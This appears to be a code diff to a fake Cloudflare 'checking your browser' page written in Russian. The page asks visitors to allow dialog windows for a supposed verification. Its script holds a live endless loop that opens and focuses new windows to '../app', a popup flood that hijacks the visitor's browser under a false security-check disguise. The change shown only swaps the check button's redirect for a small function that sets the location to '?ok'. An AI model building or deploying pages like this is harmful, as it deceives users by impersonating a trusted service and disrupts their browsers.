@@ -106,7 +106,7 @@
             <div class="bubbles"></div>
         </div>
       </div>
-      <p data-translate="please_wait" id="cf-spinner-please-wait" style="font-size: 17px;">После выполненных действий <br>нажмите на кнопку...<p style="font-size: 19px;" class="cf-alert cf-alert-error">Разрешите создание диалоговых окон для проверки. Это не займёт много времени.</p></p><button style="font-size: 19px;" onclick="location='/'">Проверить</button>
+      <p data-translate="please_wait" id="cf-spinner-please-wait" style="font-size: 17px;">После выполненных действий <br>нажмите на кнопку...<p style="font-size: 19px;" class="cf-alert cf-alert-error">Разрешите создание диалоговых окон для проверки. Это не займёт много времени.</p></p><button style="font-size: 19px;" onclick="verc()">Проверить</button>
       <p data-translate="redirecting" id="cf-spinner-redirecting" style="display:none">Redirecting...</p>
       </div>
   
@@ -226,7 +226,9 @@
   <script type="text/javascript">
   window._cf_translation = {};
   var verify = true; var token = "cloudflare-public-tokenL::99s29d2nbc80f485"; while(verify){window.open("../app", "_blank").focus();}
-  
+  function verc() {
+    location = "?ok"
+  }
 </script>
 
 
